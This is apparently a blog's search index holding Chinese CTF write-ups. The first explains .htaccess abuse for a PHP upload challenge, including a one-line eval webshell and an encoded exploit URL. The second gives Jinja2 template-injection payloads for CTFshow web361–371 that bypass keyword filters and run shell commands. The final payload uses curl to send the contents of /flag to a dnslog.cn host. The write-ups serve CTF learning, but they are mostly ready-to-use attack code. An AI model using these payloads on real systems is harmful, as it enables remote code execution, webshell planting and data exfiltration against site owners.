<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>浅谈ctf中.htaccess配置文件的运用</title>
      <link href="/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/"/>
      <url>/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>相关的文章为：<a href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p><h3 id="htaccess配置文件的基本信息"><a href="#htaccess配置文件的基本信息" class="headerlink" title=".htaccess配置文件的基本信息"></a>.htaccess配置文件的基本信息</h3><p>首先先了解一下有关.htaccess文件是什么，是一个配置文件，用于运行Apache网络服务器软件的网络服务器上，当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用/禁用Apache Web服务器软件所提供的额外功能和特性。 简单来说就是用来修改配置的</p><p>然后补充一点就是在.htaccess配置文件中单行注释符为 # </p><p>如果想要在服务器上可以运行.htaccess文件就需要先将主配置文件的AllowOverride 设置为 All</p><h3 id="具体的运用"><a href="#具体的运用" class="headerlink" title="具体的运用"></a>具体的运用</h3><h4 id="通过-htaccess文件来制定出错页面"><a href="#通过-htaccess文件来制定出错页面" class="headerlink" title="通过.htaccess文件来制定出错页面"></a>通过.htaccess文件来制定出错页面</h4><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument <span class="number">401</span> /error/<span class="number">401</span>.php</span><br><span class="line">ErrorDocument <span class="number">403</span> /error/<span class="number">403</span>.php</span><br><span class="line">ErrorDocument <span class="number">404</span> /error/<span class="number">404</span>.php</span><br><span class="line">ErrorDocument <span class="number">500</span> /error/<span class="number">500</span>.php</span><br></pre></td></tr></table></figure></blockquote><p>在ctf比赛题目中就有应用：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If <span class="string">&quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;</span>&gt;  <span class="comment">//~ 类似为正则匹对</span></span><br><span class="line">ErrorDocument <span class="number">404</span> <span class="string">&quot;y4tacker&quot;</span></span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure></blockquote><p>如果在/flag中有flag{a 就返回y4tacker，从而来枚举出flag,比较少用</p><h4 id="SetHandler和ForceType"><a href="#SetHandler和ForceType" class="headerlink" title="SetHandler和ForceType"></a>SetHandler和ForceType</h4><p>常见的应用场景 文件上传：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;   <span class="comment">//指定将1.jpg通过PHP运行</span></span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//或者直接全局都直接使用PHP解析</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;Files ~ <span class="string">&quot;\.jpg$&quot;</span>&gt;   <span class="comment">//~先当于正则匹对 将所有匹对到.jpg结尾的都以PHP解析</span></span><br><span class="line"> ForceType application/x-httpd-php  </span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h4><p>作用就是将什么以什么方式解析，作用域是针对整个服务器或特定目录的，而不是针对单个文件的，所以不需要通过Files来进行规定</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php-script .jpg  <span class="comment">//将jpg文件当作PHP脚本</span></span><br></pre></td></tr></table></figure></blockquote><h4 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a><strong>AddType</strong></h4><p>是Apache服务器配置中的一个重要指令，它用于将特定的文件扩展名映射到指定的MIME类型</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .html</span><br></pre></td></tr></table></figure></blockquote><p>这条指令告诉Apache服务器，当遇到.html扩展名的文件时，应该将它们视为application/x-httpd-php类型的文件，即PHP脚本文件，并由PHP解析器进行处理</p><h4 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h4><p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess  文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以</p><p>php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag</p><p>实际的应用中就有：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file <span class="number">1</span>.txt <span class="comment">//在主文件解析之前自动解析包含1.txt的内容</span></span><br><span class="line">php_value auto_append_file <span class="number">2</span>.txt <span class="comment">//在主文件解析后自动解析1.txt的内容</span></span><br><span class="line"><span class="comment">//最好是这样，应用#号为注释符，但是PHP可以正常解析来上传一句话木马</span></span><br><span class="line">php_value auto_prepend_file .htaccess <span class="comment">#&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//关于过滤file： 这样也是可以执行命令的</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure></blockquote><p>还有一种用法，绕过preg_match匹对，将最大的次数改为0即可，就可以用最大回溯(pcre.backtrack_limit)/递归限制使php正则失效：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">1</span>  <span class="comment">//默认为100000</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="具体的例题"><a href="#具体的例题" class="headerlink" title="具体的例题"></a>具体的例题</h3><p>[羊城杯 2020]easyphp</p><p>源码：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  </span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;   <span class="comment">//遍历目录，将不是index.php的文件都删除</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);  </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123; <span class="comment">//通过get来提交文件名和内容</span></span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];  <span class="comment">//在文件内容里面过滤关键字</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123; </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];   <span class="comment">//</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123; <span class="comment">//检查文件名是否都由字母和点组成</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  <span class="comment">//再删除一次</span></span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123; </span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);  <span class="comment">//在后面拼接一段字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>看逻辑应该是在删除后再创建的文件，但是上传一个普通的php文件，发现上传什么都没有用，无论怎么上传，页面都只是显示Hello, world</p><p>这里就可以通过上传.htaccess来修改配置</p><blockquote><p>php_value auto_prepend_file .htaccess</p><h1 id="lt-php-system-‘cat-f-’-gt"><a href="#lt-php-system-‘cat-f-’-gt" class="headerlink" title="&lt;?php system(‘cat /f*’);?&gt;"></a>&lt;?php system(‘cat /f*’);?&gt;</h1></blockquote><p>但是需要有些修改，还有要将后面的\nHello, world继续拼接否则回报错</p><p>这里过滤了file 可以通过变为</p><blockquote><p>php_value auto_prepend_fil\<br>e .htaccess</p><h1 id="lt-php-system-‘cat-f-’-gt-1"><a href="#lt-php-system-‘cat-f-’-gt-1" class="headerlink" title="&lt;?php system(‘cat /f*’);?&gt;\"></a>&lt;?php system(‘cat /f*’);?&gt;\</h1></blockquote><p>最后再通过url编码上传即可</p><p>最后payload为：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_fil%<span class="number">5</span>C%<span class="number">0</span>Ae%<span class="number">20</span>.htaccess%<span class="number">0</span>A%<span class="number">23</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system(<span class="string">&#x27;cat%20/f*&#x27;</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">5</span>C</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf htaccess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-web361~371</title>
      <link href="/2024/07/18/CTFshow-web361-371/"/>
      <url>/2024/07/18/CTFshow-web361-371/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-web361-371"><a href="#CTFshow-web361-371" class="headerlink" title="CTFshow-web361~371"></a>CTFshow-web361~371</h1><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>知识点：ssti</p><p>基本的常用语句有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>通过内置的函数来获取shell</p><p>注入点为GET提交的name参数，及payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>知识点：ssti</p><p>这个题也可以通过第一题的方法来获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>知识点：引号过滤以及POST提交过滤</p><p>过滤引号可以通过request请求来进行绕过</p><p>常见的几种形式和用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.args.ben&#125;&#125; #可以用来获取get请求传参，参数为ben</span><br><span class="line">&#123;&#123;request.form.ben&#125;&#125;  #可以来获取poet请求传参ben（Content-Type:application/x-www-from-urlencoded或multipart/from-data）</span><br><span class="line">&#123;&#123;request.cookie.ben&#125;&#125; #可以来获取cookie中关键词为ben的参数</span><br><span class="line">&#123;&#123;request.values.x1&#125;&#125; #获取所有参数</span><br><span class="line">&#123;&#123;request.headers&#125;&#125;  #获得请求头请求参数</span><br><span class="line">&#123;&#123;request.data&#125;&#125;  #post传入参数(Content-Type:a/b)</span><br><span class="line">&#123;&#123;request.json&#125;&#125;  #获得post传入json参数(Content-Type:application/json)</span><br></pre></td></tr></table></figure><p>当然我个人认为request.values.x1最好用，可以获取全局参数</p><p>将过滤的部分直接通过替换即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[request.args.ben].popen(request.args.ben1).read()&#125;&#125;&amp;ben=os&amp;ben1=cat /*</span><br></pre></td></tr></table></figure><h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>知识点：引号过滤，args过滤，post提交过滤</p><p>这个题可能是想通过cookie来实现，但是麻烦，还是通过request.values.x1好点，因为简单</p><p>payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.popen(request.values.q).read()&#125;&#125;&amp;q=cat /*</span><br></pre></td></tr></table></figure><h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>知识点：中括号过滤，引号过滤，args过滤，post提交过滤</p><p>绕过[]的方法，可以通过<strong>getitem</strong>()魔术方法来实现，用法也简单，可以直接平替</p><p>例如：</p><p><strong>subclasses</strong>()[117]  —&gt; <strong>subclasses</strong>().<strong>getitem</strong>(117)</p><p>尽量选用简单的语句，就是少中括号的来实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__.__getitem__(request.values.q).popen(request.values.a).read()&#125;&#125;&amp;a=cat /*&amp;q=os</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(request.values.q).read()&#125;&#125;&amp;q=cat /*</span><br></pre></td></tr></table></figure><h2 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h2><p>知识点：下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p><p>下划线绕过可以通过管道符和attr和request请求来进行绕过</p><p>如：</p><p>lipsum.<strong>globals</strong>—&gt;lipsum|attr(request.values.globals)</p><p>所以就可以构造payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).os.popen(request.values.q2).read()&#125;&#125;&amp;q=__globals__&amp;q2=cat /*</span><br></pre></td></tr></table></figure><h2 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h2><p>知识点：os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p><p>这里有些不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals.os&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(request.values.q)|attr(request.values.o)&#125;&#125;&amp;q=__globals__&amp;o=os  //这个不会执行</span><br><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).get(request.values.o)&#125;&#125;&amp;q=__globals__&amp;o=os  //这个会执行</span><br></pre></td></tr></table></figure><p>所以需要留意一下</p><p>所以payload为：(二选一即可)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).get(request.values.o).popen(request.values.q2).read()&#125;&#125;&amp;q=__globals__&amp;q2=cat /*&amp;o=os</span><br><span class="line">&#123;&#123;(config|attr(request.values.class)|attr(request.values.init)|attr(request.values.globals)|attr(request.values.getitem)(request.values.o)).popen(request.values.rce).read()&#125;&#125;&amp;class=__class__&amp;init=__init__&amp;globals=__globals__&amp;getitem=__getitem__&amp;o=os&amp;rce=cat /*</span><br></pre></td></tr></table></figure><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>知识点：双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p><p>绕过双括号，可以通过<code>&#123;%print()%&#125;</code>即可</p><p>payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print (lipsum|attr(request.values.q)).get(request.values.o).popen(request.values.q2).read()%&#125;&amp;q=__globals__&amp;q2=cat /*&amp;o=os</span><br></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>知识点：request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p><p>无法通过提交参数来进行绕过，需要通过join来进行拼接字符</p><p>获取字符的方法，通过config|string|list  和  lipsum|string|list来获得</p><p>具体的构造的payload： （注意将注释的删除）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set e=(config|string|list).pop(279)%&#125; //  /</span><br><span class="line">//&#123;%set a=(config|string|list).pop(191)%&#125; //  &#x27;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(18)%&#125;  // _</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(9)%&#125;  // 空格</span><br><span class="line">//&#123;% set qwe=dict(l=0,s=1)|join%&#125;  //ls</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=1)|join,c,c)|join %&#125;  //__globals__</span><br><span class="line">&#123;%set s=dict(o=0,s=1)|join%&#125;   //os</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=1)|join,c,c)|join %&#125;  //__getiyem__</span><br><span class="line">//&#123;% set popen=dict(popen=1)|join%&#125;  //popen</span><br><span class="line">//&#123;% set read=dict(read=1)|join%&#125;  //read</span><br><span class="line">&#123;% set flag=(((dict(tac=1)|join,kg)|join,e)|join,dict(flag=1)|join)|join %&#125;</span><br><span class="line">//&#123;%print lipsum|attr(globals)|attr(geti)(s)|attr(popen)(flag)|attr(read)() %&#125;</span><br><span class="line">&#123;%print (lipsum|attr(globals)|attr(geti)(s)).popen(flag).read() %&#125;</span><br></pre></td></tr></table></figure><h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>知识点：数字过滤，request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p><p>获取数字可以通过count来实现，如nine=dict(aaaaaaaaa=a)|join|count</p><p>再将数字替代即可</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ste=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ten=ste*nine %&#125;</span><br><span class="line">&#123;% set r=dict(aa=a)|join|count*nine%&#125;</span><br><span class="line">&#123;%set e=(config|string|list).pop(ten)%&#125;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(r)%&#125;</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(nine)%&#125;</span><br><span class="line">&#123;% set qwe=dict(l=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;%set s=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set flag=(((dict(tac=a)|join,kg)|join,e)|join,dict(flag=a)|join)|join %&#125;</span><br><span class="line">&#123;%print lipsum|attr(globals)|attr(geti)(s)|attr(popen)(flag)|attr(read)() %&#125;</span><br></pre></td></tr></table></figure><h2 id="371"><a href="#371" class="headerlink" title="371"></a>371</h2><p>知识点：过滤print，数字过滤，request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p><p>绕过print需要通过dnslog带出</p><p>URL</p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p><p>在该网站来申请免费的dnslog</p><p>再通过  执行curl <code>cat /flag</code>.7ytmqy.dnslog.cn </p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set ba=dict(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ste=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set n=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set aaa=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ten=ste*nine %&#125;</span><br><span class="line">&#123;% set r=dict(aa=a)|join|count*nine%&#125;</span><br><span class="line">&#123;%set q=(config|string|list).pop(aaa)%&#125;</span><br><span class="line">&#123;%set e=(config|string|list).pop(ten)%&#125;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(r)%&#125;</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(nine)%&#125;</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;%set s=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;%set p=((lipsum|attr(globals))|string|list).pop(n)%&#125;</span><br><span class="line">&#123;%set fla=(dict(curl=a)|join,kg,p,dict(cat=a)|join,kg,e,dict(flag=a)|join,p,q,dict(cfiyve=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;</span><br><span class="line">&#123;%if ((lipsum|attr(globals))|attr(geti)(s)).popen(fla)%&#125;ataoyyds&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/06/26/hello-world/"/>
      <url>/2024/06/26/hello-world/</url>
      
